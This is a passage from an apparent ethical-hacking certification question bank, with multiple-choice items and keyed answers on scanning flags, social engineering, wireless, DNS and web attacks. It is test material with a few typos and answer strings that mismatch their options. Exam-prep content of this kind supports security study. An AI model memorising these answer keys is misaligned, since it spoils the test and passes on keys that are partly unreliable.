    "answer": "Cloud-based detection",
    "hint": null,
    "options": [
      "Heuristics-based detection",
      "Behavioural-based detection",
      "Cloud-based detection",
      "Real-time protection"
    ]
  },
  {
    "question": "You are configuring the connection of a new employee's laptop to join an 802.11 network. The new laptop has the same hardware and software as the laptops of other employees. You used the wireless packet sniffer and found that it shows that the Wireless Access Point (WAR) is not responding to the association requests being sent by the laptop. What can cause this problem?",
    "answer": "The WAP does not recognize the laptop's MAC address.",
    "hint": null,
    "options": [
      "The laptop is configured for the wrong channel.",
      "The laptop cannot see the SSID of the wireless network.",
      "The WAP does not recognize the laptop's MAC address.",
      "The laptop is not configured to use DHCP."
    ]
  },
  {
    "question": "Which of the following is a logical collection of Internet-connected devices such as computers, smartphones or Internet of things (IoT) devices whose security has been breached and control ceded to a third party?",
    "answer": "Botnet",
    "hint": null,
    "options": [
      "Spambot",
      "Botnet",
      "Spear Phishing",
      "Rootkit"
    ]
  },
  {
    "question": "After several unsuccessful attempts to extract cryptography keys using software methods, Mark is thinking about trying another code-breaking methodology. Which of the following will best suit Mark based on his unsuccessful attempts?",
    "answer": "Trickery and Deceit.",
    "hint": null,
    "options": [
      "Frequency Analysis.",
      "Trickery and Deceit.",
      "Brute-Force.",
      "One-Time Pad."
    ]
  },
  {
    "question": "The firewall prevents packets from entering the organization through certain ports and applications. What does this firewall check?",
    "answer": "Application layer headers and transport layer port numbers.",
    "hint": null,
    "options": [
      "Presentation layer headers and the session layer port numbers.",
      "Application layer port numbers and the transport layer headers.",
      "Application layer headers and transport layer port numbers.",
      "Network layer headers and the session layer port numbers."
    ]
  },
  {
    "question": "Which of the following requires establishing national standards for electronic health care transactions and national identifiers for providers, health insurance plans, and employers?",
    "answer": "HIPAA",
    "hint": null,
    "options": [
      "SOX",
      "DMCA",
      "HIPAA",
      "PCI-DSS"
    ]
  },
  {
    "question": "Identify Bluetooth attack techniques that is used to send messages to users without the recipient's consent, for example for guerrilla marketing campaigns?",
    "answer": "Bluejacking",
    "hint": null,
    "options": [
      "Bluejacking",
      "Bluesnarfing",
      "Bluesmacking",
      "Bluebugging"
    ]
  },
  {
    "question": "Which of the following layers in IoT architecture helps bridge the gap between two endpoints, such as a device and a client, and carries out message routing, message identification, and subscribing?",
    "answer": "Access Gateway.",
    "hint": null,
    "options": [
      "Middleware.",
      "Access Gateway.",
      "Edge Technology.",
      "Internet."
    ]
  },
  {
    "question": "Session splicing is an IDS evasion technique that exploits how some IDSs do not reconstruct sessions before performing pattern matching on the data. The idea behind session splicing is to split data between several packets, ensuring that no single packet matches any patterns within an IDS signature. Which tool can be used to perform session splicing attacks?",
    "answer": "Whisker",
    "hint": null,
    "options": [
      "Hydra",
      "tcpsplice",
      "Whisker",
      "Burp"
    ]
  },
  {
    "question": "Your company has a risk assessment, and according to its results, the risk of a breach in the main company application is 40%. Your cybersecurity department has made changes to the application and requested a re-assessment of the risks. The assessment showed that the risk fell to 12%, with a risk threshold of 20%. Which of the following options would be the best from a business point of view?",
    "answer": "Accept the risk.",
    "hint": null,
    "options": [
      "Introduce more controls to bring risk to 0%.",
      "Limit the risk.",
      "Accept the risk.",
      "Avoid the risk."
    ]
  },
  {
    "question": "What actions should you take if you find that the company that hired you is involved with human trafficking?",
    "answer": "Stop work and contact the proper legal authorities.",
    "hint": null,
    "options": [
      "Copy the information to removable media and keep it in case you need it.",
      "Stop work and contact the proper legal authorities.",
      "Ignore the information and continue the assessment until the work is done.",
      "Confront the customer and ask her about this."
    ]
  },
  {
    "question": "Viktor, the white hat hacker, conducts a security audit. He gains control over a user account and tries to access another account's sensitive information and files. How can he do this?",
    "answer": "Privilege Escalation",
    "hint": null,
    "options": [
      "Fingerprinting",
      "Shoulder-Surfing",
      "Privilege Escalation",
      "Port Scanning"
    ]
  },
  {
    "question": "The evil hacker Ivan has installed a remote access Trojan on a host. He wants to be sure that when a victim attempts to go to \"www.site.com\" that the user is directed to a phishing site. Which file should Ivan change in this case?",
    "answer": "Hosts",
    "hint": null,
    "options": [
      "Boot.ini",
      "Sudoers",
      "Hosts",
      "Networks"
    ]
  },
  {
    "question": "Ivan, an evil hacker, is preparing to attack the network of a financial company. To do this, he wants to collect information about the operating systems used on the company's computers. Which of the following techniques will Ivan use to achieve the desired result?",
    "answer": "Banner Grabbing",
    "hint": null,
    "options": [
      "UDP Scanning.",
      "Banner Grabbing.",
      "SSDP Scanning.",
      "IDLE/IPID Scanning."
    ]
  },
  {
    "question": "Which of the following option is a security feature on switches leverages the DHCP snooping database to help prevent man-in-the-middle attacks?",
    "answer": "DAI",
    "hint": null,
    "options": [
      "Spanning tree",
      "Port security",
      "DHCP relay",
      "DAI"
    ]
  },
  {
    "question": "Michael, a technical specialist, discovered that the laptop of one of the employees connecting to a wireless point couldn't access the Internet, but at the same time, it can transfer files locally. He checked the IP address and the default gateway. They are both on 192.168.1.0/24. Which of the following caused the problem?",
    "answer": "The gateway is not routing to a public IP address.",
    "hint": null,
    "options": [
      "The laptop isn't using a private IP address.",
      "The laptop and the gateway are not on the same network.",
      "The laptop is using an invalid IP address.",
      "The gateway is not routing to a public IP address."
    ]
  },
  {
    "question": "You have been assigned the task of defending the company from network sniffing. Which of the following is the best option for this task?",
    "answer": "Using encryption protocols to secure network communications.",
    "hint": null,
    "options": [
      "Restrict Physical Access to Server Rooms hosting Critical Servers.",
      "Register all machines MAC Address in a Centralized Database.",
      "Using encryption protocols to secure network communications.",
      "Use Static IP Address."
    ]
  },
  {
    "question": "Let's assume that you decided to use PKI to protect the email you will send. At what layer of the OSI model will this message be encrypted and decrypted?",
    "answer": "Presentation layer.",
    "hint": null,
    "options": [
      "Application layer.",
      "Session layer.",
      "Transport layer.",
      "Presentation layer."
    ]
  },
  {
    "question": "Which of the following UDP ports is usually used by Network Time Protocol (NTP)?",
    "answer": "123",
    "hint": null,
    "options": [
      "19",
      "123",
      "161",
      "177"
    ]
  },
  {
    "question": "Andrew is conducting a penetration test. He is now embarking on sniffing the target network. What is not available for Andrew when sniffing the network?",
    "answer": "Modifying and replaying captured network traffic.",
    "hint": null,
    "options": [
      "Identifying operating systems, services, protocols and devices.",
      "Capturing network traffic for further analysis.",
      "Collecting unencrypted information about usernames and passwords.",
      "Modifying and replaying captured network traffic."
    ]
  },
  {
    "question": "Which of the following methods is best suited to protect confidential information on your laptop which can be stolen while travelling?",
    "answer": "Full disk encryption.",
    "hint": null,
    "options": [
      "BIOS password.",
      "Hidden folders.",
      "Full disk encryption.",
      "Password protected files."
    ]
  },
  {
    "question": "How works the mechanism of a Boot Sector Virus?",
    "answer": "Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.",
    "hint": null,
    "options": [
      "Moves the MBR to another location on the Random-access memory and copies itself to the original location of the MBR.",
      "Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.",
      "Overwrites the original MBR and only executes the new virus code.",
      "Modifies directory table entries to point to the virus code instead of the actual MBR."
    ]
  },
  {
    "question": "Which of the following flags will trigger Xmas scan?",
    "answer": "-sX",
    "hint": null,
    "options": [
      "-sP",
      "-sA",
      "-sV",
      "-sX"
    ]
  },
  {
    "question": "Rajesh, a system administrator, noticed that some clients of his company were victims of DNS Cache Poisoning. They were redirected to a malicious site when they tried to access Rajesh's company site. What is the best recommendation to deal with such a threat?",
    "answer": "Use Domain Name System Security Extensions (DNSSEC)",
    "hint": null,
    "options": [
      "Customer awareness",
      "Use a multi-factor authentication",
      "Use of security agents on customers' computers.",
      "Use Domain Name System Security Extensions (DNSSEC)"
    ]
  },
  {
    "question": "When configuring wireless on the router, your colleague disables SSID broadcast but leaves authentication \"open\" and sets SSID to a 32-character string of random letters and numbers. Which of the following is the correct statement about this scenario?",
    "answer": "The hacker still has the opportunity to connect to the network after sniffing the SSID from a successful wireless association.",
    "hint": null,
    "options": [
      "Disabling SSID broadcast prevents 802.11 beacons from being transmitted from the access point, resulting in a proper setup leveraging \"security through obscurity\".",
      "This move will prevent brute-force attacks.",
      "The hacker still has the opportunity to connect to the network after sniffing the SSID from a successful wireless association.",
      "The router is still vulnerable to wireless hacking attempts because the SSID broadcast setting can be enabled using a specially crafted packet sent to the access point's hardware address."
    ]
  },
  {
    "question": "Identify the type of hacker following description: When finding a zero-day vulnerability on a public-facing system, a hacker sends an email to the owner of the public system describing the problem and how the owner can protect themselves from that vulnerability.",
    "answer": "White hat",
    "hint": null,
    "options": [
      "Gray hat",
      "Red hat",
      "White hat",
      "Black hat"
    ]
  },
  {
    "question": "Which of the following tiers in the three-tier application architecture is responsible for moving and processing data between them?",
    "answer": "Logic tier",
    "hint": null,
    "options": [
      "Data tier",
      "Presentation tier",
      "Logic tier",
      "Application Layer"
    ]
  },
  {
    "question": "While browsing his social media feed, Jacob noticed Jane's photo with the caption: \"Learn more about your friends,\" as well as several personal questions under the post. Jacob is suspicious and texts Jane with questions about this post. Jane confirms that she did indeed post it. With the assurance that the post is legitimate, Jacob responds to the questions on the friend's post. A few days later, Jacob tries to log into his bank account and finds out that it has been compromised and the password was changed. What most likely happened?",
    "answer": "Jacob inadvertently provided the answers to his security questions when responding to Jane's post.",
    "hint": null,
    "options": [
      "Jacob's bank-account login information was brute-forced.",
      "Jacob's password was stolen while he was enthusiastically participating in the survey.",
      "Jacob inadvertently provided the answers to his security questions when responding to Jane's post.",
      "Jacob's computer was infected with a Banker Trojan."
    ]
  },
  {
    "question": "Which of the following attacks can you perform if you know that the web server handles the \"(../)\" (character string) incorrectly and returns the file listing of a folder structure of the server?",
    "answer": "Directory traversal",
    "hint": null,
    "options": [
      "Denial of service.",
      "Directory traversal.",
      "Cross-site scripting.",
      "SQL injection."
    ]
  },
  {
    "question": "Identify the phase of the APT lifecycle that the hacker is in at the moment according to the scenario given below: The hacker prepared for an attack and attempted to enter the target network using techniques such as sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. Thanks to the successful attack, he deployed malware on the target system to establish an outbound connection and began to move on.",
    "answer": "Initial intrusion",
    "hint": null,
    "options": [
      "Preparation",
      "Cleanup",
      "Persistence",
      "Initial intrusion"
    ]
  },
  {
    "question": "Imagine the following scenario: The hacker monitored and intercepted already established traffic between the victim and a host machine to predict the victim's ISN. The hacker sent spoofed packets with the victim's IP address to the host machine using the ISN. After this manipulation, the host machine responded with a packet having an incremented ISN. After this manipulation, the host machine responded with a packet having an incremented ISN. The victim's connection was interrupted, and the hacker was able to connect with the host machine on behalf of the victim. Which of the following attacks did the hacker perform?",
    "answer": "TCP/IP hijacking",
    "hint": null,
    "options": [
      "UDP hijacking",
      "TCP/IP hijacking",
      "Blind hijacking",
      "Forbidden attack"
    ]
  },
  {
    "question": "Jonh, a security specialist, conducts a pentest in his organization. He found information about the emails of two employees in some public sources and is preparing a client-side backdoor to send to the employees via email. Which of the stages of the cyber kill chain does John perform?",
    "answer": "Weaponization",
    "hint": null,
    "options": [
      "Exploitation",
      "Command and control",
      "Weaponization",
      "Reconnaissance"
    ]
  },
  {
    "question": "Which of the following is a file on a web server that can be misconfigured and provide sensitive information for a hacker, such as verbose error messages?",
    "answer": "php.ini",
    "hint": null,
    "options": [
      "idq.dll",
      "httpd.conf",
      "php.ini",
      "administration.config"
    ]
  },
  {
    "question": "Identify the correct syntax for ICMP scan on a remote computer using hping2.",
    "answer": "hping2 -1 target.domain.com",
    "hint": null,
    "options": [
      "hping2 -1 target.domain.com",
      "hping2 target.domain.com",
      "hping2 --l target.domain.com",
      "hping2 --set-ICMP target.domain.com"
    ]
  },
  {
    "question": "You need to send an email containing confidential information. Your colleague advises you to use PGP to be sure that the data will be safe. What should you use to communicate correctly using this type of encryption?",
    "answer": "Use your colleague's public key to encrypt the message.",
    "hint": null,
    "options": [
      "Use your own private key to encrypt the message.",
      "Use your own public key to encrypt the message.",
      "Use your colleague's public key to encrypt the message.",
      "Use your colleague's private key to encrypt the message."
    ]
  },
  {
    "question": "The attacker is trying to cheat one of the employees of the target organization by initiating fake calls while posing as a legitimate employee. Also, he sent phishing emails to steal employee's credentials and further compromise his account. Which of the following techniques did the attacker use?",
    "answer": "Social engineering",
    "hint": null,
    "options": [
      "Password reuse",
      "Social engineering",
      "Insider threat",
      "Reverse engineering"
    ]
  },
  {
    "question": "Jennys wants to send a digitally signed message to Molly. What key will Jennys use to sign the message, and how will Molly verify it?",
    "answer": "Jennys will sign the message with her private key, and Molly will verify that the message came from Jennys by using Jenny’s public key",
    "hint": null,
    "options": [
      "Jennys will sign the message with her private key, and Molly will verify that the message came from Jennys by using Jenny’s public key",
      "Jennys will sign the message with Molly’s private key, and Molly will verify that the message came from Jennys by using Jenny’s public key",
      "Jennys will sign the message with Molly’s public key, and Molly will verify that the message came from Jennys by using Jenny’s public key",
      "Jennys will sign the message with her public key, and Molly will verify that the message came from Jenny's by using Jenny's private key."
    ]
  },
  {
    "question": "You must bypass the firewall. To do this, you plan to use DNS to perform data exfiltration on an attacked network. You embed malicious data into the DNS protocol packets. DNSSEC can't detect these malicious data, and you successfully inject malware to bypass a firewall and maintain communication with the victim machine and C&C server. Which of the following techniques would you use in this scenario?",
    "answer": "DNS tunnelling",
    "hint": null,
    "options": [
      "DNS enumeration",
      "DNSSEC zone walking",
      "DNS cache snooping",
      "DNS tunnelling"
    ]
  },
  {
    "question": "Which of the following describes сross-site request forgery?",
    "answer": "A browser makes a request to a server without the user's knowledge.",
    "hint": null,
    "options": [
      "A request sent by a malicious user from a browser to a server.",
      "A server makes a request to another server without the user's knowledge.",
      "Modifying the request by the proxy server between the client and the server.",
      "A browser makes a request to a server without the user's knowledge."
    ]
  },
  {
    "question": "The attacker, during the attack, installed a scanner on a machine belonging to one of the employees of the target organization and scanned several machines on the same network to identify vulnerabilities to exploit further. Which of the following type of vulnerability assessment tools employed the attacker?",
    "answer": "Network-based scanner.",
    "hint": null,
    "options": [
      "Cluster scanner.",
      "Agent-based scanner.",
      "Network-based scanner.",
      "Proxy scanner."
    ]
  },
  {
    "question": "Which of the following programs is best used for analyzing packets on your wireless network?",
    "answer": "Wireshark with Airpcap",
    "hint": null,
    "options": [
      "Wireshark with Airpcap",
      "Ethereal with Winpcap",
      "Airsnort with Airpcap",
      "Wireshark with Winpcap"
    ]
  },
  {
    "question": "You must discover all the active devices hidden by a restrictive firewall in the IPv4 range in a target network. Which of the following host discovery techniques will you use?",
    "answer": "ARP ping scan",
    "hint": null,
    "options": [
      "UDP scan",
      "TCP Maimon scan",
      "ARP ping scan",
      "ACK flag probe scan"
    ]
  },
  {
    "question": "During testing execution, you established a connection with your computer using the SMB service and entered your login and password in plaintext. After the testing is completed, you need to delete the data about the login and password you entered so that no one can use it. Which of the following files do you need to clear?",
    "answer": ".bash_history",
    "hint": null,
    "options": [
      ".bash_history",
      ".profile",
      ".xsession-log",
      ".bashrc"
    ]
  },
  {
    "question": "Identify the footprinting technique by description: Using this technique, an attacker can gather domain information such as the target domain name, contact details of its owner, expiry date, and creation date. Also, using this information, an attacker can create a map of the organization’s network and misleads domain owners with social engineering to obtain internal details of its network.",
    "answer": "Whois footprinting",
    "hint": null,
    "options": [
      "VPN footprinting",
      "Email footprinting",
      "VoIP footprinting",
      "Whois footprinting"
    ]
  },
  {
    "question": "You have been assigned the task of checking the implementation of security policies in the company. During the audit, you found that a user from the IT department had a dial-out modem installed. Which of the following security policies should you check to see if dial-out modems are allowed?",
    "answer": "Remote-access policy",
    "hint": null,
    "options": [
      "Acceptable-use policy",
      "Permissive policy",
      "Firewall policy",
      "Remote-access policy"
    ]
  },
  {
    "question": "Andy, the evil hacker, wants to collect information about Nick. He discovered that Nick's organization recently purchased new equipment. Andy decided to call Nick masquerading as a legitimate customer support executive, informing him that their new systems need to be serviced for proper functioning and notified him that customer support would send a computer technician. Nick agreed and agreed on a date for a meeting with Andy. A few days later, Andy entered the territory of Nick's organization unhindered and gathered sensitive information by scanning terminals for passwords, searching for important documents in desks, and rummaging bins. What is the type of attack technique Andy used on Nick?",
    "answer": "Impersonation attack",
    "hint": null,
    "options": [
      "Shoulder surfing attack",
      "Dumpster diving attack",
      "Eavesdropping attack",
      "Impersonation attack"
    ]
  },
  {
    "question": "Which of the following services runs directly on TCP port 445?",
    "answer": "Server Message Block (SMB)",
    "hint": null,
    "options": [
      "Server Message Block (SMB)",
      "Telnet",
      "Network File System (NFS)",
      "Remote procedure call (RPC)"
    ]
  },
  {
    "question": "Your organization's network uses the network address 192.168.1.64 with mask 255.255.255.192, and servers in your organization's network are in the addresses 192.168.1.140, 192.168.1.141 and 192.168.1.142. The attacker who wanted to find them couldn't do it. He used the following command for the network scanning: nmap 192.168.1.64/28. Why couldn't the attacker find these servers?",
    "answer": "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range",
    "hint": null,
    "options": [
      "He needs to add the command \"ip address\" just before the IP address",
      "He needs to change the address to 192.168.1.0 with the same mask",
      "The network must be dawn and the nmap command and IP address are ok",
      "He is scanning from 192.168.1.64 to 192.168.1.78 because of the mask /28 and the servers are not in that range"
    ]
  },
  {
    "question": "You use Docker architecture in your application to employ a client/server model. And you need to use a component that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks. Which of the following Docker components will you use for these purposes?",
    "answer": "Docker daemon",
    "hint": null,
    "options": [
      "Docker client",
      "Docker daemon",
      "Docker objects",
      "Docker registries"
    ]
  },
  {
    "question": "You have decided to test your organization's website. For this purpose, you need a tool that can work as a proxy and save every request and response. Also, this tool must allow you to test parameters and headers manually to get more precise results than if using web vulnerability scanners. Which of the following tools is appropriate for your requirements?",
    "answer": "Burp suite",
    "hint": null,
    "options": [
      "Maskgen",
      "Proxychains",
      "Burp suite",
      "S3Scanner"
    ]
  },
  {
    "question": "You enter the following command to get the necessary data: ping-* 6 192.168.120.114. Output: 1. Pinging 192.168.120.114 with 32 bytes of data: 2. Reply from 192.168.120.114: bytes=32 time<1ms TTL=128 3. Reply from 192.168.120.114: bytes=32 time<1ms TTL=128 4. Reply from 192.168.120.114: bytes=32 time<1ms TTL=128 5. Reply from 192.168.120.114: bytes=32 time<1ms TTL=128 6. Reply from 192.168.120.114: bytes=32 time<1ms TTL=128 7. Reply from 192.168.120.114: bytes=32 time<1ms TTL=128 8. Ping statistics for 192.168.120.114 9. Packets: Sent = 6, Received = 6, Lost = 0 (0% loss). 10. Approximate round trip times in milli-seconds: 11. Minimum = 0ms, Maximum = 0ms, Average = 0ms. Which of the following flags is hidden under \"*\"?",
    "answer": "n",
    "hint": null,
    "options": [
      "n",
      "a",
      "s",
      "t"
    ]
  },
  {
    "question": "What is the common name of vulnerability disclosure programs opened by companies on HackerOne, Bugcrowd, etc.?",
    "answer": "Bug bounty program",
    "hint": null,
    "options": [
      "Vulnerability hunting program",
      "Bug bounty program",
      "Ethical hacking program",
      "White-hat hacking program"
    ]
  },
  {
    "question": "Percival, the evil hacker, found the contact number of cybersecuritycompany.org on the internet and dialled the number, claiming himself to represent a technical support team from a vendor. He informed an employee of cybersecuritycompany that a specific server would be compromised and requested the employee to follow the provided instructions. Consequently, he prompted the victim to execute unusual commands and install malicious files, which were then used to collect and pass critical information to his machine. Which of the following social engineering techniques did Percival use?",
    "answer": "Quid pro quo",
    "hint": null,
    "options": [
      "Quid pro quo",
      "Phishing",
      "Elicitation",
      "Diversion theft"
    ]
  },
  {
    "question": "Marketing department employees complain that their computers are working slow and every time they attempt to go to a website, they receive a series of pop-ups with advertisements. Which of the following type of malwares infected their systems?",
    "answer": "Adware",
    "hint": null,
    "options": [
      "Trojan",
      "Adware",
      "Virus",
      "Spyware"
    ]
  },
  {
    "question": "You need to identify the OS of the target host. You want to use the Unicornscan tool to do this. As a result of using the tool, you got the TTL value and determined that the target system is running a Windows OS. Which of the following TTL values did you get when using the program?",
    "answer": "128",
    "hint": null,
    "options": [
      "128",
      "255",
      "64",
      "138"
    ]
  },
  {
    "question": "Which of the following is the hacker's first step in conducting a DNS cache poisoning attack on a target organization?",
    "answer": "The hacker makes a request to the DNS resolver.",
    "hint": null,
    "options": [
      "The hacker makes a request to the DNS resolver.",
      "The hacker queries a nameserver using the DNS resolver.",
      "The hacker uses TCP to poison the DNS resolver.",
      "The hacker forges a reply from the DNS resolver."
    ]
  },
  {
    "question": "Which of the following is a type of virus detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities?",
    "answer": "Code Emulation",
    "hint": null,
    "options": [
      "Integrity checking",
      "Heuristic Analysis",
      "Code Emulation",
      "Scanning"
    ]
  },
  {
    "question": "Identify the attack technique by description: The attacker gains unauthorized access to the target network, remains there without being detected for a long time, and obtains sensitive information without sabotaging the organization.",
    "answer": "Advanced persistent threat.",
    "hint": null,
    "options": [
      "Advanced persistent threat.",
      "Spear-phishing sites.",
      "Diversion theft.",
      "Insider threat."
    ]
  },
  {
    "question": "Identify the technique by description: During the execution of this technique, an attacker copies the entire website and its content on a local drive to view the complete profile of the site's directory structure, file structure, web pages, images, etc. Thanks to the information gathered using this technique, an attacker map the website's directories and gains valuable information.",
    "answer": "Website mirroring",
    "hint": null,
    "options": [
      "Web cache poisoning",
      "Website defacement",
      "Website mirroring",
      "Session hijacking"
    ]
  },
  {
    "question": "John sent a TCP ACK segment to a known closed port on a firewall, but it didn't respond with an RST. What conclusion can John draw about the firewall he scanned?",
    "answer": "It's a stateful firewall.",
    "hint": null,
    "options": [
      "It's a non-stateful firewall.",
      "There is no firewall.",
      "It's a stateful firewall.",
      "John can't draw any conclusions based on this information."
    ]
  },
  {
    "question": "At which of the following stages of the cyber kill chain does data exfiltration occur?",
    "answer": "Actions on objectives",
    "hint": null,
    "options": [
      "Installation",
      "Weaponization",
      "Actions on objectives",
      "Command and control"
    ]
  },
  {
    "question": "Your friend installed the application from a third-party app store. After a while, some of the applications in his smartphone were replaced by malicious applications that appeared legitimate, and he began to receive a lot of advertising spam. Which of the following attacks has your friend been subjected to?",
    "answer": "Agent Smith attack",
    "hint": null,
    "options": [
      "Clickjacking",
      "SMS phishing attack",
      "SIM card attack",
      "Agent Smith attack"
    ]
  },
  {
    "question": "Identify the attack used in the scenario below: The victim connected his iPhone to a public computer that the attacker had previously infected. After establishing the connection with this computer, the victim enabled iTunes Wi-Fi sync so that the device could continue communication with that computer even after being physically disconnected. Now the attacker who infected the computer can access the victim's iPhone and monitor all of the victim's activity on the iPhone, even after the device is out of the communication zone.",
    "answer": "iOS trustjacking",
    "hint": null,
    "options": [
      "iOS trustjacking",
      "Exploiting SS7 vulnerability",
      "Man-in-the-disk attack",
      "iOS jailbreaking"
    ]
  },
  {
    "question": "You must to identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered. Which of the following nmap commands do you must use to perform the TCP SYN ping scan?",
    "answer": "nmap -sn -PS < target IP address >",
    "hint": null,
    "options": [
      "nmap -sn -PS < target IP address >",
      "nmap -sn -PO < target IP address >",
      "nmap -sn -PP < target IP address >",
      "nmap -sn -PA < target IP address >"
    ]
  },
  {
    "question": "According to the configuration of the DHCP server, only the last 100 IP addresses are available for lease in subnet 10.1.4.0/23. Which of the following IP addresses is in the range of the last 100 addresses?",
    "answer": "10.1.5.200",
    "hint": null,
    "options": [
      "10.1.4.254",
      "10.1.155.200",
      "10.1.3.156",
      "10.1.5.200"
    ]
  },
  {
    "question": "You have detected an abnormally large amount of traffic coming from local computers at night. You decide to find out the reason, do a few checks and find that an attacker has exfiltrated user data. Also, you noticed that AV tools could not find any malicious software, and the IDS/IPS has not reported on any non-whitelisted programs. Which of the following type of malware did the attacker use to bypass your company’s application whitelisting?",
    "answer": "Fileless malware",
    "hint": null,
    "options": [
      "Phishing malware",
      "Logic bomb malware",
      "Fileless malware",
      "Zero-day malware"
    ]
  },
  {
    "question": "Viktor, a professional hacker, targeted an organization’s network to sniff all the traffic. During this process, Viktor plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the network. What is the attack performed by Viktor in the above scenario?",
    "answer": "STP attack",
    "hint": null,
    "options": [
      "DNS poisoning attack",
      "ARP spoofing attack",
      "STP attack",
      "VLAN hopping attack"
    ]
  },
  {
    "question": "Which of the following is an IOS jailbreaking technique that patches the kernel during the device boot to keep jailbroken after each reboot?",
    "answer": "Untethered jailbreaking",
    "hint": null,
    "options": [
      "Semi-tethered jailbreaking",
      "Semi-untethered jailbreaking",
      "Tethered jailbreaking",
      "Untethered jailbreaking"
    ]
  },
  {
    "question": "An ethical hacker has already received all the necessary information and is now considering further actions. For example, infect a system with malware and use phishing to gain credentials to a system or web application. What phase of ethical hacking methodology is the hacker currently in?",
    "answer": "Gaining access",
    "hint": null,
    "options": [
      "Reconnaissance",
      "Maintaining access",
      "Scanning",
      "Gaining access"
    ]
  },
  {
    "question": "You must choose a tool for monitoring your organization's website, analyzing the website's traffic, and tracking the geographical location of the users visiting the organization's website. Which of the following tools will you use for these purposes?",
    "answer": "Web-Stat",
    "hint": null,
    "options": [
      "WAFW00F",
      "WebSite-Watcher",
      "Webroot",
      "Web-Stat"
    ]
  },
  {
    "question": "Which of the following online tools allows attackers to gather information related to the model of the IoT device and the certifications granted to it?",
    "answer": "FCC ID search",
    "hint": null,
    "options": [
      "search.com",
      "Google image search",
      "FCC ID search",
      "EarthExplorer"
    ]
  },
  {
    "question": "You want to execute an SQLi attack. The first thing you check is testing the response time of a true or false response. Secondly, you want to use another command to determine whether the database will return true or false results for user IDs. Which two SQL injection types have you tried to perform?",
    "answer": "Time-based and boolean-based",
    "hint": null,
    "options": [
      "Union-based and error-based",
      "Out of band and boolean-based",
      "Time-based and union-based",
      "Time-based and boolean-based"
    ]
  },
  {
    "question": "Identify the Bluetooth hacking technique, which refers to the theft of information from a wireless device through Bluetooth?",
    "answer": "Bluesnarfing",
    "hint": null,
    "options": [
      "Bluesnarfing",
      "Bluesmacking",
      "Bluebugging",
      "Bluejacking"
    ]
  },
  {
    "question": "Which of the following keys can you share using asymmetric cryptography?",
    "answer": "Public keys",
    "hint": null,
    "options": [
      "User passwords",
      "Private keys",
      "Public keys",
      "Public and private keys"
    ]
  },
  {
    "question": "Which of the following commands verify a user ID on an SMTP server?",
    "answer": "VRFY",
    "hint": null,
    "options": [
      "NOOP",
      "VRFY",
      "EXPN",
      "RCPT"
    ]
  },
  {
    "question": "Your organization uses LDAP for accessing distributed directory services. An attacker knowing this can try to take advantage of an automated tool to anonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names to launch further attacks on your organization. Which of the following tools can an attacker use to gather information from the LDAP service?",
    "answer": "JXplorer",
    "hint": null,
    "options": [
      "Zabasearch",
      "ike-scan",
      "EarthExplorer",
      "JXplorer"
    ]
  },
  {
    "question": "You need to assess the system used by your employee. During the assessment, you found that compromise was possible through user directories, registries, and other system parameters. Also, you discovered vulnerabilities such as native configuration tables, incorrect registry or file permissions, and software configuration errors. Which of the following types of vulnerability assessments that you conducted?",
    "answer": "Host-based assessment",
    "hint": null,
    "options": [
      "Host-based assessment",
      "Credentialed assessment",
      "Distributed assessment",
      "Database assessment"
    ]
  },
  {
    "question": "Ivan, the evil hacker, decided to attack the cloud services of the target organization. First of all, he decided to infiltrate the target's MSP provider by sending phishing emails that distributed specially created malware. This program compromised users' credentials, and Ivan managed to gain remote access to the cloud service. Further, he accessed the target customer profiles with his MSP account, compressed the customer data, and stored them in the MSP. After this, he used this information to launch further attacks on the target organization. Which of the following cloud attacks did Ivan perform?",
    "answer": "Cloud hopper attack",
    "hint": null,
    "options": [
      "Cloud hopper attack",
      "Cloudborne attack",
      "Man-in-the-cloud (MITC) attack",
      "Cloud cryptojacking"
    ]
  },
  {
    "question": "The attacker wants to attack the target organization's Internet-facing web server. In case of a successful attack, he will also get access to back-end servers protected by a firewall. The attacker plans to use URL https://mainurl.com/feed.php?url=externalsite.com/feed/to to obtain a remote feed and alter the URL to the localhost to view all the local resources on the target server. Which of the following types of attacks is the attacker planning to perform?",
    "answer": "Server-side request forgery attack",
    "hint": null,
    "options": [
      "Website defacement.",
      "Web server misconfiguration.",
      "Server-side request forgery attack.",
      "Web cache poisoning attack."
    ]
  },
  {
    "question": "Identify the technique by description: The attacker wants to create a botnet. Firstly, he collects information about a large number of vulnerable machines to create a list. Secondly, they infect the machines. The list is divided by assigning half of the list to the newly compromised machines. The scanning process runs simultaneously. This technique ensures a very fast spreading and installation of malicious code.",
    "answer": "Hit-list scanning technique",
    "hint": null,
    "options": [
      "Topological scanning technique",
      "Permutation scanning technique",
      "Hit-list scanning technique",
      "Subnet scanning technique"
    ]
  },
  {
    "question": "You come to a party with friends and ask the apartment owner about access to his wireless network. It tells you the name of the wireless point and its password, but when you try to connect to it, the connection occurs without asking for a password. Which of the following attacks could have occurred?",
    "answer": "Evil twin attack",
    "hint": null,
    "options": [
      "Evil twin attack",
      "Piggybacking attack",
      "Wireless sniffing",
      "Wardriving attack"
    ]
  },
  {
    "question": "Identify wireless security protocol by description: This wireless security protocol allows 192-bit minimum-strength security protocols and cryptographic tools to protect sensitive data, such as 256-bit Galois/Counter Mode Protocol (GCMP-256), 84-bit Hashed Message Authentication Mode with Secure Hash Algorithm (HMAC-SHA384), and Elliptic Curve Digital Signature Algorithm (ECDSA) using a 384-bit elliptic curve.",
    "answer": "WPA3-Enterprise",
    "hint": null,
    "options": [
      "WPA3-Personal",
      "WPA2-Personal",
      "WPA3-Enterprise",
      "WPA2-Enterprise"
    ]
  },
  {
    "question": "You know that an attacker can create websites similar to legitimate sites in pharming and phishing attacks. Which of the following is the difference between them?",
    "answer": "Phishing attack: an attacker provides the victim with a URL that is either misspelled or looks similar to the legitimate website's domain name. Pharming attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities.",
    "hint": null,
    "options": [
      "Both pharming and phishing attacks are identical.",
